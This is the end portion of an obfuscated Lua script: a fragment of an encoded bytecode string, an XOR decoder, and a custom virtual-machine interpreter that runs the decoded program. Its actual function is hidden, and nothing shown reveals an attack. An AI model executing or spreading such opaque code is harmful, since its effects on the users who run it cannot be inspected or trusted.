31852TI2BB2BQ2LU2MS31NL31CH318P2MR318T2HJ31812LU31NR311F2VQ2GN2GT2PF31O92BW31A92YL2TJ2BB31O62TP31O6319E27523N31882PF31ON2FJ31OE2Z831NN31OI2PF31OK2VQ31D02BB2782MG31OZ31OD2BC2KV31O02BB31P32Y427931P32MG31OX31DN31O12MG2BJ31OR2BC2X52EK31OH31NQ2BC31OL311F2XQ2PF2L931PJ2BB310N31P731PR2Q32L831O427931OK31BY2462K52BB2B62MG31Q72PF2MQ31PV2462IE31PY31QD2W427931QI31PD31PP31Q5311H2BB311L2LU31QP2PF24L2HB31OS2OG31OU31PO317C31Q524G2BC29Z2MG31R32TP24U31QW2BC2Q731PA27531O624624O2FM2PB2RP2JH31AO2MV31ON31NL2AX31HG2BG31D031N924H31DM2D531RI31H72RC23W2XP2PJ23O2EU31E431D02CK31S42PE24431S72CN31SB31NM31R331N531N12582JG24031R32FQ2MY31SJ2PJ24631SP2B431SL31E231SI2CM31SU2K82RP31SS317S2EU2FP2P531R331GA31SW31H231S9318N2CF31D0319T2B731NP27L31G92R02EM31TH2UY2KK31N9319C31DD2G3');local o=bit and bit.bxor or function(e,l)local n,o=1,0 while e>0 and l>0 do local t,c=e%2,l%2 if t~=c then o=o+n end e,l,n=(e-t)/2,(l-c)/2,n*2 end if e<l then e=l end while e>0 do local l=e%2 if l>0 then o=o+n end e,n=(e-l)/2,n*2 end return o end local function n(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;local e=1;local function l()local c,t,l,n=d(f,e,e+3);c=o(c,150)t=o(t,150)l=o(l,150)n=o(n,150)e=e+4;return(n*16777216)+(l*65536)+(t*256)+c;end;local function B()local l=o(d(f,e,e),150);e=e+1;return l;end;local function c()local l,n=d(f,e,e+2);l=o(l,150)n=o(n,150)e=e+2;return(n*256)+l;end;local function G()local e=l();local l=l();local t=1;local o=(n(l,1,20)*(2^32))+e;local e=n(l,21,31);local l=((-1)^n(l,32));if(e==0)then if(o==0)then return l*0;else e=1;t=0;end;elseif(e==2047)then return(o==0)and(l*(1/0))or(l*(0/0));end;return C(l,e-1023)*(t+(o/(2^52)));end;local h=l;local function C(l)local n;if(not l)then l=h();if(l==0)then return'';end;end;n=t(f,e,e+l-1);e=e+l;local l={}for e=1,#n do l[e]=i(o(d(t(n,e,e)),150))end return P(l);end;local e=l;local function P(...)return{...},s('#',...)end local function I()local f={};local t={};local e={};local a={f,t,nil,e};local e=l()local o={}for n=1,e do local l=B();local e;if(l==0)then e=(B()~=0);elseif(l==3)then e=G();elseif(l==1)then e=C();end;o[n]=e;end;a[3]=B();for e=1,l()do t[e-1]=I();end;for a=1,l()do local e=B();if(n(e,1,1)==0)then local t=n(e,2,3);local d=n(e,4,6);local e={c(),c(),nil,nil};if(t==0)then e[3]=c();e[4]=c();elseif(t==1)then e[3]=l();elseif(t==2)then e[3]=l()-(2^16)elseif(t==3)then e[3]=l()-(2^16)e[4]=c();end;if(n(d,1,1)==1)then e[2]=o[e[2]]end if(n(d,2,2)==1)then e[3]=o[e[3]]end if(n(d,3,3)==1)then e[4]=o[e[4]]end f[a]=e;end end;return a;end;local function h(e,i,c)local l=e[1];local n=e[2];local e=e[3];return function(...)local o=l;local C=n;local t=e;local B=P local l=1;local d=-1;local P={};local G={...};local f=s('#',...)-1;local s={};local n={};for e=0,f do if(e>=t)then P[e-t]=G[e+1];else n[e]=G[e+1];end;end;local G=f-t+1 local e;local t;while true do e=o[l];t=e[1];if t<=57 then if t<=28 then if t<=13 then if t<=6 then if t<=2 then if t<=0 then if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;elseif t==1 then local t;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=n[e[3]][n[e[4]]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;else n[e[2]]();end;elseif t<=4 then if t==3 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else local e=e[2];d=e+G-1;for l=e,d do local e=P[l-e];n[l]=e;end;end;elseif t>5 then n[e[2]]=c[e[3]];else local e=e[2]local o,l=B(n[e](a(n,e+1,d)))d=l+e-1 local l=0;for e=e,d do l=l+1;n[e]=o[l];end;end;elseif t<=9 then if t<=7 then local t;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=n[e[3]][n[e[4]]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;elseif t>8 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else if(n[e[2]]~=e[4])then l=l+1;else l=e[3];end;end;elseif t<=11 then if t==10 then n[e[2]][n[e[3]]]=n[e[4]];else local e=e[2]local o,l=B(n[e](a(n,e+1,d)))d=l+e-1 local l=0;for e=e,d do l=l+1;n[e]=o[l];end;end;elseif t==12 then if n[e[2]]then l=l+1;else l=e[3];end;else if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;end;elseif t<=20 then if t<=16 then if t<=14 then local a=C[e[3]];local d;local t={};d=r({},{__index=function(l,e)local e=t[e];return e[1][e[2]];end,__newindex=function(n,e,l)local e=t[e]e[1][e[2]]=l;end;});for c=1,e[4]do l=l+1;local e=o[l];if e[1]==42 then t[c-1]={n,e[3]};else t[c-1]={i,e[3]};end;s[#s+1]=t;end;n[e[2]]=h(a,d,c);elseif t==15 then local e=e[2]n[e]=n[e](a(n,e+1,d))else local t;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=n[e[3]][n[e[4]]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;end;elseif t<=18 then if t==17 then local t;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=n[e[3]][n[e[4]]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;else n[e[2]]=(e[3]~=0);l=l+1;end;elseif t>19 then local o=e[2]local t={n[o](a(n,o+1,e[3]))};local l=0;for e=o,e[4]do l=l+1;n[e]=t[l];end else n[e[2]]=n[e[3]][e[4]];end;elseif t<=24 then if t<=22 then if t>21 then local e=e[2]n[e](a(n,e+1,d))else if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;end;elseif t>23 then local i;local f;local h,s;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t]()l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]h,s=B(n[t](a(n,t+1,e[3])))d=s+t-1 f=0;for e=t,d do f=f+1;n[e]=h[f];end;l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,d))l=l+1;e=o[l];t=e[2];d=t+G-1;for e=t,d do i=P[e-t];n[e]=i;end;l=l+1;e=o[l];t=e[2];do return n[t](a(n,t+1,d))end;l=l+1;e=o[l];t=e[2];do return a(n,t,d)end;l=l+1;e=o[l];do return end;else n[e[2]]=n[e[3]][n[e[4]]];end;elseif t<=26 then if t==25 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t]()l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t]()l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];else n[e[2]]={};end;elseif t==27 then n[e[2]]=h(C[e[3]],nil,c);else n[e[2]][e[3]]=n[e[4]];end;elseif t<=42 then if t<=35 then if t<=31 then if t<=29 then c[e[3]]=n[e[2]];elseif t==30 then local l=e[2];do return n[l](a(n,l+1,e[3]))end;else local e=e[2]n[e]=n[e](n[e+1])end;elseif t<=33 then if t>32 then local e=e[2];do return n[e](a(n,e+1,d))end;else if n[e[2]]then l=l+1;else l=e[3];end;end;elseif t>34 then local e=e[2]n[e]=n[e](n[e+1])else n[e[2]][e[3]]=n[e[4]];end;elseif t<=38 then if t<=36 then local f;local i,h;local t;n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]i,h=B(n[t](n[t+1]))d=h+t-1 f=0;for e=t,d do f=f+1;n[e]=i[f];end;l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,d))elseif t>37 then local l=e[2]local o,e=B(n[l](a(n,l+1,e[3])))d=e+l-1 local e=0;for l=l,d do e=e+1;n[l]=o[e];end;else local e=e[2]n[e]=n[e]()end;elseif t<=40 then if t>39 then local f;local i,h;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];t=e[2]i,h=B(n[t](n[t+1]))d=h+t-1 f=0;for e=t,d do f=f+1;n[e]=i[f];end;l=l+1;e=o[l];t=e[2]i,h=B(n[t](a(n,t+1,d)))d=h+t-1 f=0;for e=t,d do f=f+1;n[e]=i[f];end;l=l+1;e=o[l];t=e[2]n[t](a(n,t+1,d))l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]();else local l=e[2]n[l]=n[l](a(n,l+1,e[3]))end;elseif t==41 then local t;local d;local a;n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];a=e[3];d=n[a]for e=a+1,e[4]do d=d..n[e];end;n[e[2]]=d;l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else n[e[2]]=n[e[3]];end;elseif t<=49 then if t<=45 then if t<=43 then l=e[3];elseif t==44 then n[e[2]]=i[e[3]];else local o=e[2];local c=n[o+2];local t=n[o]+c;n[o]=t;if(c>0)then if(t<=n[o+1])then l=e[3];n[o+3]=t;end elseif(t>=n[o+1])then l=e[3];n[o+3]=t;end end;elseif t<=47 then if t>46 then local l=e[2]n[l]=n[l](a(n,l+1,e[3]))else do return n[e[2]]end end;elseif t>48 then local l=e[2]local t={n[l](n[l+1])};local o=0;for e=l,e[4]do o=o+1;n[e]=t[o];end else if(n[e[2]]~=e[4])then l=l+1;else l=e[3];end;end;elseif t<=53 then if t<=51 then if t>50 then local l=e[2]local t={n[l](n[l+1])};local o=0;for e=l,e[4]do o=o+1;n[e]=t[o];end else local l=e[2];local o=n[e[3]];n[l+1]=o;n[l]=o[e[4]];end;elseif t==52 then n[e[2]]=e[3];else n[e[2]][n[e[3]]]=n[e[4]];end;elseif t<=55 then if t>54 then local l=e[2];do return n[l](a(n,l+1,e[3]))end;else local a=C[e[3]];local d;local t={};d=r({},{__index=function(l,e)local e=t[e];return e[1][e[2]];end,__newindex=function(n,e,l)local e=t[e]e[1][e[2]]=l;end;});for c=1,e[4]do l=l+1;local e=o[l];if e[1]==42 then t[c-1]={n,e[3]};else t[c-1]={i,e[3]};end;s[#s+1]=t;end;n[e[2]]=h(a,d,c);end;elseif t==56 then local o=e[2];local c=n[o+2];local t=n[o]+c;n[o]=t;if(c>0)then if(t<=n[o+1])then l=e[3];n[o+3]=t;end elseif(t>=n[o+1])then l=e[3];n[o+3]=t;end else do return end;end;elseif t<=86 then if t<=71 then if t<=64 then if t<=60 then if t<=58 then local t;c[e[3]]=n[e[2]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];do return end;elseif t>59 then local e=e[2]n[e]=n[e]()else local f;local i,h;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]i,h=B(n[t](n[t+1]))d=h+t-1 f=0;for e=t,d do f=f+1;n[e]=i[f];end;l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,d))end;elseif t<=62 then if t==61 then local o=e[2];local l=n[e[3]];n[o+1]=l;n[o]=l[e[4]];else n[e[2]]=(e[3]~=0);l=l+1;end;elseif t>63 then local t;n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]();l=l+1;e=o[l];l=e[3];else local e=e[2]n[e](n[e+1])end;elseif t<=67 then if t<=65 then local o=e[3];local l=n[o]for e=o+1,e[4]do l=l..n[e];end;n[e[2]]=l;elseif t==66 then n[e[2]]=(e[3]~=0);else local e=e[2];do return a(n,e,d)end;end;elseif t<=69 then if t==68 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;else local l=e[2]local o,e=B(n[l]())d=e+l-1 local e=0;for l=l,d do e=e+1;n[l]=o[e];end;end;elseif t==70 then local t=e[2];local c=e[4];local o=t+2 local t={n[t](n[t+1],n[o])};for e=1,c do n[o+e]=t[e];end;local t=t[1]if t then n[o]=t l=e[3];else l=l+1;end;else if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;end;elseif t<=78 then if t<=74 then if t<=72 then local o=e[2];local c=e[4];local t=o+2 local o={n[o](n[o+1],n[t])};for e=1,c do n[t+e]=o[e];end;local o=o[1]if o then n[t]=o l=e[3];else l=l+1;end;elseif t==73 then local f;local s,h;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2]s,h=B(n[t]())d=h+t-1 f=0;for e=t,d do f=f+1;n[e]=s[f];end;l=l+1;e=o[l];t=e[2]n[t](a(n,t+1,d))l=l+1;e=o[l];l=e[3];else local o=e[3];local l=n[o]for e=o+1,e[4]do l=l..n[e];end;n[e[2]]=l;end;elseif t<=76 then if t>75 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else local l=e[2]local o,e=B(n[l](a(n,l+1,e[3])))d=e+l-1 local e=0;for l=l,d do e=e+1;n[l]=o[e];end;end;elseif t>77 then n[e[2]]=i[e[3]];else n[e[2]]=(e[3]~=0);end;elseif t<=82 then if t<=80 then if t>79 then local f;local h,i;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]h,i=B(n[t](a(n,t+1,e[3])))d=i+t-1 f=0;for e=t,d do f=f+1;n[e]=h[f];end;l=l+1;e=o[l];t=e[2];do return n[t](a(n,t+1,d))end;l=l+1;e=o[l];t=e[2];do return a(n,t,d)end;l=l+1;e=o[l];do return end;else c[e[3]]=n[e[2]];end;elseif t==81 then n[e[2]]=e[3];else local e=e[2];d=e+G-1;for l=e,d do local e=P[l-e];n[l]=e;end;end;elseif t<=84 then if t==83 then local e=e[2];do return a(n,e,d)end;else local e=e[2]local o,l=B(n[e]())d=l+e-1 local l=0;for e=e,d do l=l+1;n[e]=o[l];end;end;elseif t>85 then do return end;else local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;end;elseif t<=101 then if t<=93 then if t<=89 then if t<=87 then n[e[2]]=h(C[e[3]],nil,c);elseif t==88 then l=e[3];else local f;local h,s;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2]h,s=B(n[t]())d=s+t-1 f=0;for e=t,d do f=f+1;n[e]=h[f];end;l=l+1;e=o[l];t=e[2]n[t](a(n,t+1,d))l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];l=e[3];end;elseif t<=91 then if t>90 then n[e[2]]=n[e[3]][n[e[4]]];else local e=e[2]n[e]=n[e](a(n,e+1,d))end;elseif t>92 then local o=e[2];local t=n[o]local c=n[o+2];if(c>0)then if(t>n[o+1])then l=e[3];else n[o+3]=t;end elseif(t<n[o+1])then l=e[3];else n[o+3]=t;end else local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;end;elseif t<=97 then if t<=95 then if t==94 then local l=e[2]local t={n[l](a(n,l+1,e[3]))};local o=0;for e=l,e[4]do o=o+1;n[e]=t[o];end else if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;end;elseif t==96 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else local e=e[2]local o,l=B(n[e](n[e+1]))d=l+e-1 local l=0;for e=e,d do l=l+1;n[e]=o[l];end;end;elseif t<=99 then if t>98 then local f;local h,s;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2]h,s=B(n[t]())d=s+t-1 f=0;for e=t,d do f=f+1;n[e]=h[f];end;l=l+1;e=o[l];t=e[2]n[t](a(n,t+1,d))else n[e[2]]=c[e[3]];end;elseif t>100 then local e=e[2];do return n[e](a(n,e+1,d))end;else n[e[2]]=n[e[3]][e[4]];end;elseif t<=108 then if t<=104 then if t<=102 then local e=e[2]local o,l=B(n[e](n[e+1]))d=l+e-1 local l=0;for e=e,d do l=l+1;n[e]=o[l];end;elseif t>103 then local t;n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]();l=l+1;e=o[l];l=e[3];else if not n[e[2]]then l=l+1;else l=e[3];end;end;elseif t<=106 then if t>105 then n[e[2]]={};else local e=e[2]n[e](n[e+1])end;elseif t==107 then local t;local a;local d;c[e[3]]=n[e[2]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];d=e[2]a={n[d](n[d+1])};t=0;for e=d,e[4]do t=t+1;n[e]=a[t];end l=l+1;e=o[l];l=e[3];else local o=e[2];local t=n[o]local c=n[o+2];if(c>0)then if(t>n[o+1])then l=e[3];else n[o+3]=t;end elseif(t<n[o+1])then l=e[3];else n[o+3]=t;end end;elseif t<=112 then if t<=110 then if t>109 then if not n[e[2]]then l=l+1;else l=e[3];end;else if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;end;elseif t==111 then local a;local d;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2];d=n[t]a=n[t+2];if(a>0)then if(d>n[t+1])then l=e[3];else n[t+3]=d;end elseif(d<n[t+1])then l=e[3];else n[t+3]=d;end else local e=e[2]n[e](a(n,e+1,d))end;elseif t<=114 then if t==113 then local f;local h,i;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]h,i=B(n[t](n[t+1]))d=i+t-1 f=0;for e=t,d do f=f+1;n[e]=h[f];end;l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,d))else n[e[2]]();end;elseif t==115 then do return n[e[2]]end else n[e[2]]=n[e[3]];end;l=l+1;end;end;end;return h(I(),{},L())();
end
